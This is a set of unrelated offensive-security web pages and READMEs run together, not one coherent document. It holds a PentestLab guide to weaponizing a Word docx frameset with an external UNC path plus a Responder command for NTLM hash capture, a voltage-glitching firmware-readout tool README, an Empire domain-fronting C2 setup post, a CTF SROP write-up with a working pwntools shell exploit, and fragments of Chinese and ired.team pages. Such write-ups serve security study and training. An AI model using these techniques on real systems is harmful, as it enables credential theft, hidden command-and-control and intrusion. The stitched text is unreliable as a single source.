5bb9\u6613\u88ab\u4eba\u5ffd\u7565\u7684\u5f31\u70b9\u3002\n\u672c\u6587\u7531\u4e91\u5f71\u5b9e\u9a8c\u5ba4\u539f\u521b\u53d1\u5e03\n\u8f6c\u8f7d\uff0c\u8bf7\u53c2\u8003[27]\u8f6c\u8f7d\u58f0\u660e\uff0c\u6ce8\u660e\u51fa\u5904\uff1a [28]https:\/\/www.anquanke.com\/post\/id\/152631\n\u5b89\u5168\u5ba2 - \u6709\u601d\u60f3\u7684\u5b89\u5168\u65b0\u5a92\u4f53\n[29]360\u4e91\u5f71\u5b9e\u9a8c\u5ba4 [30]Cuckoo\u6c99\u7bb1 [31]\u6c99\u7bb1\u6d4b\u8bd5 (BUTTON) \u8d5e ( 3) (BUTTON) \u6536\u85cf\n\u4e91\u5f71\u5b9e\u9a8c\u5ba4 \u8ba4\u8bc1\n\u5206\u4eab\u5230\uff1a QQ\u7a7a\u95f4 \u65b0\u6d6a\u5fae\u535a \u5fae\u4fe1 QQ facebook twitter\n|\u63a8\u8350\u9605\u8bfb\n[32][t01e068dc6b63059c39.png]\n\u5b9e\u529b\u8ba4\u53ef\uff01\u77e5\u9053\u521b\u5b87\u83b7\u56fd\u5bb6\u5de5\u4e1a\u4fe1\u606f\u5b89\u5168\u53d1\u5c55\u7814\u7a76\u4e2d\u5fc3\u611f\u8c22\u4fe1\n2024-01-08 18:16:55\n[33][t011600665fbea2fca6.png]\n6 \u5927\u5173\u952e\u8bcd\uff0c\u56de\u987e\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u7684 2023\uff01\n2024-01-03 14:39:15\n[34][t015d9043ac81607317.jpg]\nCVE-2023-36802 \u4e0e\u4e00\u79cd\u65b0\u7684\u8bfb\u5199\u539f\u8bed ioring\n2023-12-29 17:07:16\n[35][]\n\u4e00\u4e2a\u5e16\u5b50\n2023-12-27 18:56:05\n|\u53d1\u8868\u8bc4\u8bba\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n(BUTTON) \u53d1\u8868\u8bc4\u8bba\n|\u8bc4\u8bba\u5217\u8868\n\u8fd8\u6ca1\u6709\u8bc4\u8bba\u5462\uff0c\u5feb\u53bb\u62a2\u4e2a\u6c99\u53d1\u5427~\n\u52a0\u8f7d\u66f4\u591a\n\u4e91\u5f71\u5b9e\u9a8c\u5ba4 []\n\u4e91\u5f71\u5b9e\u9a8c\u5ba4\uff0c\u662f\u4e13\u6ce8\u6d41\u91cf\u68c0\u6d4b\u3001\u6f0f\u6d1e\u5206\u6790\u4e0e\u6316\u6398\u7b49\u7f51\u7edc\u653b\u9632\u7814\u7a76\u7684\u5b89\u5168\u56e2\u961f\u3002\n\u6587\u7ae0\n41\n\u7c89\u4e1d\n82\n(BUTTON) \u5173\u6ce8\nTA\u7684\u6587\u7ae0\n[36]Gvm\u6f0f\u6d1e\u7ba1\u7406\u6846\u67b6\uff08\u4e00\uff09\u4e4b\u5b89\u88c5\u4e0e\u7ec4\u6210\u4ecb\u7ecd\n2021-12-21 17:30:32\n[37]Log4shell\u6f0f\u6d1e\u7814\u7a76\u53ca\u5176\u6316\u77ff\u6848\u4f8b\u5206\u6790\n2021-12-15 15:30:51\n[38]Exchange\u6f0f\u6d1e\u5206\u6790\uff08\u4e8c\uff09\uff1a\u53cd\u5e8f\u5217\u5316\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2021\u201342321\uff09\n2021-12-01 14:30:31\n[39]Exchange\u6f0f\u6d1e\u5206\u6790\uff08\u4e00\uff09\uff1aSSRF RCE\uff08CVE-2021-26855\u3001CVE-2021-27065\uff09\n2021-11-21 10:00:47\n[40]\u57df\u7528\u6237\u5bc6\u7801\u7206\u7834\u7814\u7a76\n2021-01-27 15:30:00\n____________________\n\u76f8\u5173\u6587\u7ae0\n* [41]\u5b9e\u529b\u8ba4\u53ef\uff01\u77e5\u9053\u521b\u5b87\u83b7\u56fd\u5bb6\u5de5\u4e1a\u4fe1\u606f\u5b89\u5168\u53d1\u5c55\u7814\u7a76\u4e2d\u5fc3\u611f\u8c22\u4fe1\n* [42]6 \u5927\u5173\u952e\u8bcd\uff0c\u56de\u987e\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u7684 2023\uff01\n\u70ed\u95e8\u63a8\u8350\n\u6587\u7ae0\u76ee\u5f55\n[43]0x00 \u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0bCuckoo [44]0x01 \u901a\u5e38\u60c5\u51b5\u4e0b\u5982\u4f55\u5bf9\u6297\u6c99\u7bb1 [45]\u9488\u5bf9\u865a\u62df\u673a [46]\u9488\u5bf9\u68c0\u6d4b\u65f6\u95f4\n[47]\u9488\u5bf9\u4ea4\u4e92 [48]0x02 \u8fd9\u4e2a\u6837\u672c\u662f\u600e\u4e48\u505a\u7684 [49]0x03 \u7ec6\u8282\u539f\u7406 [50]0x04 \u7ed3\u8bba\n\u5b89\u5168\u5ba2Logo\n\u5b89\u5168\u5ba2\n\u5fae\u4fe1\u4e8c\u7ef4\u7801\n(BUTTON) \u00d7\n\u5b89\u5168\u5ba2\n\u5b89\u5168\u5ba2\n* [51]\u5173\u4e8e\u6211\u4eec\n* [52]\u8054\u7cfb\u6211\u4eec\n* [53]\u7528\u6237\u534f\u8bae\n\u5546\u52a1\u5408\u4f5c\n* [54]\u5408\u4f5c\u5185\u5bb9\n* [55]\u8054\u7cfb\u65b9\u5f0f\n* [56]\u53cb\u60c5\u94fe\u63a5\n\u5185\u5bb9\u987b\u77e5\n* [57]\u6295\u7a3f\u987b\u77e5\n* [58]\u8f6c\u8f7d\u987b\u77e5\n* \u5b98\u7f51QQ\u7fa48\uff1a819797106\n* \u5b98\u7f51QQ\u7fa43\uff1a830462644(\u5df2\u6ee1)\n* \u5b98\u7f51QQ\u7fa42\uff1a814450983(\u5df2\u6ee1)\n* \u5b98\u7f51QQ\u7fa41\uff1a702511263(\u5df2\u6ee1)\n\u5408\u4f5c\u5355\u4f4d\n* [59]\u5b89\u5168\u5ba2\n* [60]\u5b89\u5168\u5ba2\nCopyright \u00a9 \u5317\u4eac\u5947\u864e\u79d1\u6280\u6709\u9650\u516c\u53f8 360\u7f51\u7edc\u653b\u9632\u5b9e\u9a8c\u5ba4 \u5b89\u5168\u5ba2 All Rights Reserved\n[61]\u4eacICP\u590708010314\u53f7-66\n[t0179ac3294ef926b8c.png]"}
{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb Microsoft Office \u2013 NTLM\nHashes via Frameset Comments Feed [4]alternate [5]alternate\n[6]Penetration Testing Lab [7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]December 18, 2017\nMicrosoft Office \u2013 NTLM Hashes via Frameset\nby [28]Administrator.In [29]Red Team.[30]8 Comments on Microsoft Office\n\u2013 NTLM Hashes via Frameset\nMicrosoft office documents are playing a vital role towards red team\nassessments as usually they are used to gain some initial foothold on\nthe client\u2019s internal network. Staying under the radar is a key element\nas well and this can only be achieved by abusing legitimate\nfunctionality of Windows or of a trusted application such as Microsoft\noffice.\nHistorically Microsoft Word was used as an HTML editor. This means that\nit can support HTML elements such as framesets. It is therefore\npossible to link a Microsoft Word document with a UNC path and combing\nthis with responder in order to capture NTLM hashes externally.\nWord documents with the docx extension are actually a zip file which\ncontains various XML documents. These XML files are controlling the\ntheme, the fonts, the settings of the document and the web settings.\nUsing [31]7-zip it is possible to open that archive in order to examine\nthese files:\nDocx Contents Docx Contents\nThe word folder contains a file which is called webSettings.xml. This\nfile needs to be modified in order to include the frameset.\nwebSettings File webSettings File\nAdding the following code will create a link with another file.\n<w:frameset>\n<w:framesetSplitbar>\n<w:w w:val=\"60\"\/>\n<w:color w:val=\"auto\"\/>\n<w:noBorder\/>\n<\/w:framesetSplitbar>\n<w:frameset>\n<w:frame>\n<w:name w:val=\"3\"\/>\n<w:sourceFileName r:id=\"rId1\"\/>\n<w:linkedToFile\/>\n<\/w:frame>\n<\/w:frameset>\n<\/w:frameset>\nwebSettings XML - Frameset webSettings XML \u2013 Frameset\nThe new webSettings.xml file which contains the frameset needs to be\nadded back to the archive so the previous version will be overwritten.\nwebSettings with Frameset - Adding new version to archive webSettings\nwith Frameset \u2013 Adding new version to archive\nA new file (webSettings.xml.rels) must be created in order to contain\nthe relationship ID (rId1) the UNC path and the TargetMode if it is\nexternal or internal.\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<Relationships\nxmlns=\"http:\/\/schemas.openxmlformats.org\/package\/2006\/relationships\">\n<Relationship Id=\"rId1\" Type=\"http:\/\/schemas.openxmlformats.org\/officeDocument\/2\n006\/relationships\/frame\" Target=\"\\\\192.168.1.169\\Microsoft_Office_Updates.docx\"\nTargetMode=\"External\"\/>\n<\/Relationships>\nwebSettings XML Relationship File - Contents webSettings XML\nRelationship File \u2013 Contents\nThe _rels directory contains the associated relationships of the\ndocument in terms of fonts, styles, themes, settings etc. Planting the\nnew file in that directory will finalize the relationship link which\nhas been created previously via the frameset.\nwebSettings XML rels webSettings XML rels\nNow that the Word document has been weaponized to connect to a UNC path\nover the Internet responder can be configured in order to capture the\nNTLM hashes.\nresponder -I wlan0 -e 192.168.1.169 -b -A -v\nFrameset - Responder Configuration Responder Configuration\nOnce the target user open the word document it will try to connect to a\nUNC path.\nWord - Connect to UNC Path via Frameset Word \u2013 Connect to UNC Path via\nFrameset\nResponder will retrieve the NTLMv2 hash of the user.\nResponder - NTLMv2 Hash via Frameset Responder \u2013 NTLMv2 Hash via\nFrameset\nAlternatively Metasploit Framework can be used instead of Responder in\norder to capture the password hash.\nauxiliary\/server\/capture\/smb\nMetasploit - SMB Capture Module for Frameset Metasploit \u2013 SMB Capture\nModule\nNTLMv2 hashes will be captured in Metasploit upon opening the document.\nMetasploit SMB Capture Module - NTLMv2 Hash via Frameset Metasploit SMB\nCapture Module \u2013 NTLMv2 Hash via Frameset\nConclusion\nThis technique can allow the red team to grab domain password hashes\nfrom users which can lead to internal network access if 2-factor\nauthentication for VPN access is not enabled and there is a weak\npassword policy. Additionally if the target user is an elevated account\nsuch as local administrator or domain admin then this method can be\ncombined with SMB relay in order to obtain a Meterpreter session.\nRate this:\nShare this:\n* [32]Twitter\n* [33]Facebook\n* [34]LinkedIn\n* [35]Reddit\n* [36]Tumblr\n* [37]WhatsApp\n* [38]Telegram\n* [39]Pinterest\n* [40]Pocket\n* [41]Email\n*\nLike Loading...\nRelated\n[42]Frameset[43]Microsoft Office[44]NTLM[45]password\nhashes[46]passwords[47]Red Team\n8 Comments\n1. Pingback: [48]Microsoft Word - UNC Path Injection with Image\nLinking\n2. Pingback: [49]Microsoft Word \u2013 UNC Path Injection with Image\nLinking \u2013 Information Security Outsider\n3. Pingback: [50]Capturing NetNTLM Hashes with Office [DOT] XML\nDocuments \u2013 | bohops |\n4. Pingback: [51]MOV AX, BX Code depilation salon: Articles, Code\nsamples, Processor code documentation, Low-level programming,\nWorking with debuggers List of Awesome Red Teaming Resources\n5. Pingback: [52]A Curated List of Phishing Resources -\nPhishiverse.com\n6. Pingback: [53]RED TEAMING_Final Att&ck \u2013 B4cKD00\u20b9\n7. Pingback: [54]A Pentesters Guide \u2013 Part 4 (Grabbing Hashes and\nForging External Footholds) \u2013 My WordPress\n8. Pingback: [55]How is it possible to get infected with malware by\nopening a file on a Mac or Windows machine?\nLeave a Reply [56]Cancel reply\n\u0394\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\nPost navigation\n[57]Previous Previous post: Microsoft Office \u2013 Payloads in\nDocument Properties\n[58]Next Next post: Command and Control \u2013 Images\nFollow PenTest Lab\nEnter your email address to follow this blog and receive notifications\nof new articles by email.\nEmail Address: ____________________\n(BUTTON) Follow\nJoin 2,591 other subscribers\nSearch Topic\n____________________ (BUTTON) Search\nRecent Posts\n* [59]Persistence \u2013 Event Log\n* [60]Initial Access \u2013 search-ms URI Handler\n* [61]Persistence \u2013 Scheduled Task Tampering\n* [62]Persistence \u2013 Windows Telemetry\n* [63]Persistence \u2013 Service Control Manager\nCategories\n* [64]Coding (10)\n* [65]Exploitation Techniques (19)\n* [66]External Submissions (3)\n* [67]General Lab Notes (22)\n* [68]Information Gathering (12)\n* [69]Infrastructure (2)\n* [70]Maintaining Access (4)\n* [71]Mobile Pentesting (7)\n* [72]Network Mapping (1)\n* [73]Post Exploitation (13)\n* [74]Red Team (123)\n+ [75]Credential Access (3)\n+ [76]Defense Evasion (22)\n+ [77]Domain Escalation (5)\n+ [78]Domain Persistence (4)\n+ [79]Initial Access (1)\n+ [80]Lateral Movement (2)\n+ [81]Man-in-the-middle (1)\n+ [82]Persistence (34)\n+ [83]Privilege Escalation (17)\n* [84]Reviews (1)\n* [85]Social Engineering (11)\n* [86]Tools (7)\n* [87]VoIP (4)\n* [88]Web Application (14)\n* [89]Wireless (2)\nPentest Laboratories Discord\n* [90]Discord\nPen Test Lab Stats\n* 7,183,884 hits\n[91]Facebook Page\n[92]Facebook Page\n__________________________________________________________________\n[93]Blog at WordPress.com.\n* [94]Methodologies\n+ [95]Red Teaming\no [96]Persistence\n* [97]Resources\n+ [98]Papers\no [99]Web Application\n+ [100]Presentations\no [101]Defcon\no [102]DerbyCon\no [103]Tools\n+ [104]Videos\no [105]BSides\no [106]Defcon\no [107]DerbyCon\no [108]Hack In Paris\n* [109]Contact\n+ [110]About Us\n* [111]Comment\n* [112]Reblog\n* [113]Subscribe [114]Subscribed\n+ [115]Penetration Testing Lab\nJoin 2,289 other subscribers\n____________________\n(Sign me up) Sign me up\n+ Already have a WordPress.com account? [116]Log in now.\n*\n+ [117]Penetration Testing Lab\n+ [118]Customize\n+ [119]Subscribe [120]Subscribed\n+ [121]Sign up\n+ [122]Log in\n+ [123]Copy shortlink\n+ [124]Report this content\n+ [125]View post in Reader\n+ [126]Manage subscriptions\n+ [127]Collapse this bar\nLoading Comments...\nWrite a Comment...\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\nEmail (Required) ____________________\nName (Required) ____________________\nWebsite ____________________\nPost Comment\nIFRAME: [128]likes-master\n%d"}
{"text":"# Pico-glitcher\n\nMost information is in the blogpost: https:\/\/zeus.ugent.be\/blog\/22-23\/reverse_engineering_epaper\/\n\nThis is a voltage glitching exploit tool that works against the CC2510, and probably also against other CCxxxx Texas Instruments wireless chips that contain an 8051 core and the ChipCon debugging protocol.\n\nIt runs on a Raspberry Pi Pico chip. To start working on an exploit for your device, get a development board (or a spare device) and run the following steps on a separate computer, without moving or touching the board the CC2510 chip is on too much:\n\n1. Check if readout protection is enabled using `serial_number.py`\n2. If not, you're in luck, use `reader.py` to read out the firmware\n3. If it is, wipe the development board and run `explore.py` (without the MOSFET soldered) to make sure the debug sequence works. Then write to it (`writer.py`) and lock it again (`locker.py`).\n3. Solder the MOSFET and use `explore.py` with a wide range and low iterations count (100) to find the approximate location of both glitch locations. In `analyze.py` are some estimations that worked on my board.\n4. Narrow the glitch locations and duration down with 10000 iterations and a smaller range (~50)\n5. Verify you can read out data with `exploit.py` (you'll need to modify the params)\n5. Solder the MOSFET on the second board, and redo the parameter tuning, and re-run `exploit.py`. This is best done in a tmux session, since it will take a long time.\n\nI used the IRLML6246TRPBF MOSFET, but other fast N-channel MOSFETs should also work."}
{"text":"[1]Xor'd\n* [2]About\n* [3]Blog\nEmpire Domain Fronting\nSo Domain Fronting seems to be the hot topic as of late. This will be\nshort, and I won\u2019t repeat information in regards to what Domain\nFronting is and how it can be used to abuse high trust domains. For\ndetailed explanations and examples, please look over [4]this white\npaper, as well as an excellent blog [5]post from Vincent Yiu. For\nadditional information, you can also take a look at another [6]post or\nthis [7]video by Raphael Mudge for implementation with Cobalt Strike.\nThe setup process for Domain Fronting in Empire is simple. Most of the\noverhead will be required during the configuration of your chosen CDN.\nFor this walkthrough, we will use Amazon CloudFront. There are plenty\nof other CDNs that could be used but Amazon has the easiest setup.\nTo get started, head over to [8]https:\/\/aws.amazon.com. You will need\nto create an account if you haven\u2019t already, and then head over to the\nAmazon CloudFront menu. First we will need to create a distribution and\nchoose the web delivery method. You will then setup the origin\nhostname. The origin will be the domain name of your Empire server.\nAWS Create Distribution Settings\nThe origin path is optional and won\u2019t be needed for use with Empire.\nYou should set the Viewer Protocol Policy according to what protocol is\nbeing used for your Empire listener. It\u2019s okay to select the \u201cHTTP and\nHTTPS\u201d option. For the HTTP methods, you will need GET and POST, so\nchoose the last option.\nAWS Create Distribution Settings pt 2\nThe only other settings that will need to be changed are \u201cForward\nCookies\u201d and \u201cQuery String Forwarding and Caching\u201d. These options\nprevent any of our headers and\/or cookies from being cached. Doing so\nwill surely result in lost agents. The correct settings are shown in\nthe screenshot above.\nOnce we save our settings, take note of the Cloudfront domain that you\nwere given, you will need that for configuration in Empire. After\nsaving, it will take some time for the changes to propagate throughout\nAmazon\u2019s CDN. In order to take advantage of Domain Fronting in Empire\nwe had to make a slight change in how headers are used. Previously,\nheaders specified in the profile string would be ignored during the\nstaging process. That would result in lost agents during Stage0.\nThe setup in Empire is straightforward. You will just need to set the\nlistener Host option to one of Amazon\u2019s front domains (such as\nd0.awsstatic.com) and then add a custom Host header that points to your\ncustom CloudFront domain name you saved from before. Example listener\nconfiguration shown below.\nSet listener options\nShow Listener Options\nYou can add custom HTTP headers by including them in the profile. The\nprofile is divided into three sections, with the first and second being\nthe stager URIs and User-Agent respectively. The final section is\nreserved for custom headers in the format \u201cName:Value\u201d. Each section of\nthe profile is delimited by a \u201c|\u201d character, as well as each header\nname value pair.\nAfter we launch an Empire stager, we can see that Amazon\u2019s Front Domain\nis used as the C2 domain, but the Host header is used to direct traffic\ntowards its intended destination.\nWireshark\nDomain Fronting allows an attacker to utilize trusted domains for C2\ncommunications and to circumvent proxy restrictions. The compatible\nversion of Empire is available in the [9]2.0_beta branch.\n*****\nWritten by Chris Ross on 09 February 2017"}
{"text":"[1]SROP Exploitation with radare2 (BUTTON)\n* [2]Home\n* [3]Posts\n* [4]Projects\n* [5]Recipes\n*\n*\n*\n*\n*\n*\n[6]SROP Exploitation with radare2\n[7]r2 [8]radare2 [9]rop [10]exploitation [11]ctf\nRecently I\u2019ve discovered a [12]paper that demonstrates a fancy\nROP-style exploitation technique for Linux based systems. It\u2019s called\nSigreturn-oriented programming (SROP) and was released by two dudes of\nthe Vrije Universiteit Amsterdam in 2014. This post contains background\ninformation on this exploitation technique and shows how to pull it off\nusing radare2 and pwntools.\nSigreturn-Oriented Programming\nThe cool thing about this technique is that only one or two gadgets are\nrequired in order to get control over all registers of the target\nprocess. Two preconditions have to be met:\n1. A syscall gadget is available at a predictable location\n2. There\u2019s a way to set the RAX register to 0xF\nSROP abuses the sigreturn() syscall which normally restores the process\ncontext after a signal handler returns. There\u2019s a great [13]article on\nLWN that explains this really well - I have nothing to add here (and\nI\u2019m lazy) so I\u2019ll just cite two paragraphs of this article by Jonathan\nCorbet:\n__________________________________________________________________\nEnter sigreturn() , a Linux system call that nobody calls directly.\nWhen a signal is delivered to a process, execution jumps to the\ndesignated signal handler; when the handler is done, control returns to\nthe location where execution was interrupted. Signals are a form of\nsoftware interrupt, and all of the usual interrupt-like accounting must\nbe dealt with. In particular, before the kernel can deliver a signal,\nit must make a note of the current execution context, including the\nvalues stored in all of the processor registers.\nIt would be possible to store this information in the kernel itself,\nbut that might make it possible for an attacker (of a different\nvariety) to cause the kernel to allocate arbitrary amounts of memory.\nSo, instead, the kernel stores this information on the stack of the\nprocess that is the recipient of the signal. Prior to invoking the\nsignal handler, the kernel pushes an (architecture-specific) variant of\nthe sigcontext structure onto the process\u2019s stack; this structure\ncontains register information, floating-point status, and more. When\nthe signal handler has completed its job, it calls sigreturn() , which\nrestores all that information from the on-stack structure.\n__________________________________________________________________\nOk cool!\nThe fact that the sigcontext structure is being passed to the kernel on\nthe stack makes it easy for attackers to send their own sigcontext\nalong with the remaining payload. Let\u2019s have a look the kernel source\ncode to check what\u2019s going on in detail when pulling this attack off.\nThe definition of the amd64 version of sigcontext is present in\n[14]this source code file of the kernel:\nstruct sigcontext_64 {\n__u64   r8;\n__u64   r9;\n__u64   r10;\n__u64   r11;\n__u64   r12;\n__u64   r13;\n__u64   r14;\n__u64   r15;\n__u64   di;\n__u64   si;\n__u64   bp;\n__u64   bx;\n__u64   dx;\n__u64   ax;\n__u64   cx;\n__u64   sp;\n__u64   ip;\n__u64   flags;\n__u16   cs;\n__u16   gs;\n__u16   fs;\n__u16   ss;\n__u64   err;\n__u64   trapno;\n__u64   oldmask;\n__u64   cr2;\n__u64   fpstate;\n__u64   reserved1[8];\n};\nWhen executing sigreturn(), the function restore_sigcontext() will be\neventually be called in the kernel. The implementation can be found\n[15]here. This is the function prototype:\nstatic int restore_sigcontext(struct pt_regs *regs,\nstruct sigcontext __user *usc,\nunsigned long uc_flags)\nThe usc value is a pointer to the user-supplied sigcontext structure\nthat will be copied to kernel-land at the beginning of the function:\nstruct sigcontext sc;\n[...]\nif (copy_from_user(&sc, usc, CONTEXT_COPY_SIZE))\nreturn -EFAULT;\nAs you can see below, the kernel takes the values of sc and just copies\nthem to the registers:\n[...]\nregs->bx = sc.bx;\nregs->cx = sc.cx;\nregs->dx = sc.dx;\nregs->si = sc.si;\nregs->di = sc.di;\nregs->bp = sc.bp;\nregs->ax = sc.ax;\nregs->sp = sc.sp;\nregs->ip = sc.ip;\n[...]\nNow imagine an attacker passing a prepared sigcontext structure to the\nkernel while exploiting a certain application. After sigreturn() has\nfinished, the instruction pointer is under control of the attacker. But\nas you can see, other registers like the stack pointer have also been\noverwritten and there\u2019s no direct way for the attacker to reliably\nrestore this information. In consequence, there are now two possible\noptions for an attacker:\n* The registers are set up in a way that allow executing another\nsyscall, e.g. execve() to spawn a shell.\n* There\u2019s an information leak, so the attacker is able to get more\ninformation on the memory layout. One scenario would be to call\nmprotect() on an attacker-controlled memory location with a\npredictable address and jump to this memory region afterwards in\norder to execute shellcode.\nOK BUT HOW!!1!\nThis time the target application will be small_boi, a CTF challenge\nfrom the CSAW CTF 2019 qualification round. The binary is available\nover [16]here.\nNow, let\u2019s use radare2 from git and check the binary first:\n[0x0040018c]> i\ntype     EXEC (Executable file)\narch     x86\nbintype  elf\nbits     64\ncanary   false\npic      false\nstatic   true\nThe binary is not position independent and we can therefore predict the\naddresses of ROP gadgets. Apart from the entry point, there\u2019s only one\nfunction present in the binary:\n[0x0040018c]> pdf\n; CALL XREF from entry0 @ 0x4001b6\n;-- rip:\n\u250c 33: fcn.0040018c ();\n\u2502           ; var int64_t var_20h @ rbp-0x20\n\u2502           0x0040018c      55             push rbp\n\u2502           0x0040018d      4889e5         mov rbp, rsp\n\u2502           0x00400190      488d45e0       lea rax, [var_20h]\n\u2502           0x00400194      4889c6         mov rsi, rax\n\u2502           0x00400197      4831c0         xor rax, rax\n\u2502           0x0040019a      4831ff         xor rdi, rdi\n\u2502           0x0040019d      48c7c2000200.  mov rdx, 0x200\n\u2502           0x004001a4      0f05           syscall\n\u2502           0x004001a6      b800000000     mov eax, 0\n\u2502           0x004001ab      5d             pop rbp\n\u2514           0x004001ac      c3             ret\n[0x0040018c]> .afvd var_20h\n0x7ffc881ef7b8 = (qword)0x0000000000000000\nThe application invokes the read() syscall (0x0) with a file descriptor\nvalue of 0, which is equivalent to stdin. According to the other\nparameters, it reads 0x200 bytes into the var_20h buffer.\nHint: Using [17]this table is a convenient way to check syscall numbers\nand their implementation.\nNow let\u2019s determine when the suspected buffer overflow happens. The\nbinary reads from stdin, so the best way to pass input to the target is\nby using a rarun2 profile:\ncat > profile.rr2 << EOF\n#!\/usr\/bin\/rarun2\nprogram=.\/small_boi\nstdin=\/tmp\/in\nEOF\nNow fill the input file with a ragg2 pattern, launch r2 and continue\nuntil the crash happens:\nr2 -A -r profile.rr2 -c \"dc\" -d small_boi\n[0x004001ac]> pd1\n\u2502           ;-- rip:\n\u2514           0x004001ac  c3  ret\n[0x004001ac]> pxw 4@rsp\n0x7ffc4f332fb0  0x414f4141  AAOA\n[0x004001ac]> wopO 0x414f4141\n40\nThe crash happens at a ret instruction. The offset can be determined by\npassing the topmost value of the stack to wopO, which works with the\nragg2 pattern.\nConsidering that small_boi is a static binary and relatively small, not\nmany ROP gadgets are available. However, one specific gadget can be of\nuse for SROP:\n[0x0040018c]> \/R\n[...]\n0x00400180         b80f000000  mov eax, 0xf\n0x00400185               0f05  syscall\n0x00400187                 90  nop\n0x00400188                 5d  pop rbp\n0x00400189                 c3  ret\n[...]\nThis is the only gadget required, since it sets EAX to the syscall\nnumber of sigreturn() and also invokes the syscall afterwards. The only\nthing left is to append a sigcontext structure at the end of the\npayload. The plan is to call execve() with the argument \/bin\/sh. This\nspecific string is already present in the target binary at 0x004001CA.\nThe pwntools framework has [18]some functionality for SROP and also\nprovides a way to generate the sigcontext structure. The implementation\ncan be found [19]here and it can be integrated into our exploit as\nfollows:\n#!\/usr\/bin\/env python3\nfrom pwntools_r2 import *\nfrom pwn import *\ncontext.terminal = ['tmux', 'splitw', '-v']\ncontext.arch = \"amd64\"\nr2script = \"\"\"\n#r2.cmd('aaa')\n#r2.cmd('db fcn.0040018c')\n#r2.cmd('dc')\n#r2.cmd('V!')\n\"\"\"\nframe = SigreturnFrame()\nframe.rax = 0x3b # execve syscall number\nframe.rdi = 0x004001ca # address of \/bin\/sh string\nframe.rip = 0x00400185 # syscall gadget\npayload = b\"\"\npayload += b\"A\" * 40 # offset\npayload += p64(0x00400180) # invoke SROP\npayload += bytes(frame) # append sigcontext\np = r2dbg('.\/small_boi', r2script=r2script)\np.sendline(payload) # Send the target payload\np.interactive()\nThis causes RIP to point to the SROP invocation gadget after the ret\nhappens. This is how the whole payload looks like in a hexdump:\n00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\n*\n00000020  41 41 41 41 41 41 41 41  80 01 40 00 00 00 00 00  |AAAAAAAA..@.....|\n00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000090  00 00 00 00 00 00 00 00  ca 01 40 00 00 00 00 00  |..........@.....|\n000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n000000c0  3b 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |;...............|\n000000d0  00 00 00 00 00 00 00 00  85 01 40 00 00 00 00 00  |..........@.....|\n000000e0  00 00 00 00 00 00 00 00  33 00 00 00 00 00 00 00  |........3.......|\n000000f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000120  00 00 00 00 00 00 00 00                           |........|\n00000128\nHere you can recognize the values that have been set for the frame\nvariable in the Python code above. One additional value is present at\nthe end: 0x33. It\u2019s the value of the CS register which basically sets\nthe CPU in 64 bit mode. This is one of the reasons why the target\narchitecture has to be specified before creating a SigreturnFrame\nobject with pwntools.\nHere\u2019s what the exploitation looks like, starting from the execution of\nthe vulnerable function. Also notice how the register values change\nafter the syscall instruction of the SROP gadget:\nSROP\nThanks for reading, now go and wash your hands\nRelated\n[20]37C3 CTF: ezrop\n[21]ctf [22]reversing [23]exploitation [24]rop [25]radare2 [26]r2\n[27]BinaryGolf 2023: Building A GameBoy-Bash Polyglot\n[28]binary [29]ctf\n[30]Analysis of Satisfyer Toys: Discovering an Authentication Bypass with r2\nand Frida\n[31]radare2 [32]r2 [33]frida [34]r2frida [35]reverse-engineering\n[36]web [37]vulnerability\n[tag.png]\n\u00a9 All rights reserved. Powered by [38]Hugo and [39]Minimal"}
{"text":"Red Team Notes\n[1]linkedin[2]twitter[3]patreon[4]github\nSearch\n\u2303K\nLinks\nWhat is ired.team notes?\nPinned\nPentesting Cheatsheets\nActive Directory & Kerberos Abuse\noffensive security\nRed Team Infrastructure\nInitial Access\nCode Execution\nCode & Process Injection\nDefense Evasion\nEnumeration and Discovery\nPrivilege Escalation\nCredential Access & Dumping\nLateral Movement\nPersistence\nExfiltration\nreversing, forensics & misc\nInternals\nConfiguring Kernel Debugging Environment with kdnet and WinDBG Preview\nCompiling a Simple Kernel Driver, DbgPrint, DbgView\nLoading Windows Kernel Driver for Debugging\nSubscribing to Process Creation, Thread Creation and Image Load\nNotifications from a Kernel Driver\nListing Open Handles and Finding Kernel Object Addresses\nSending Commands From Your Userland Program to Your Kernel Driver using\nIOCTL\nWindows Kernel Drivers 101\nWindows x64 Calling Convention: Stack Frame\nLinux x64 Calling Convention: Stack Frame\nSystem Service Descriptor Table - SSDT\nInterrupt Descriptor Table - IDT\nToken Abuse for Privilege Escalation in Kernel\nManipulating ActiveProcessLinks to Hide Processes in Userland\nETW: Event Tracing for Windows 101\nExploring Injected Threads\nParsing PE File Headers with C++\nInstrumenting Windows APIs with Frida\nExploring Process Environment Block\nWriting a Custom Bootloader\nCloud\nNeo4j\nDump Virtual Box Memory\nAES Encryption Using Crypto++ .lib in Visual Studio C++\nReversing Password Checking Routine\nPowered By GitBook\nComment on page\nSending Commands From Your Userland Program to Your Kernel Driver using IOCTL\nWindows Driver Model (WDM)\nThis is a quick exercise that demonstrates how to:\nCreate a simple WDM kernel mode driver, that can receive and respond\nto a custom defined input\/output control code (IOCTL) sent in from\na userland 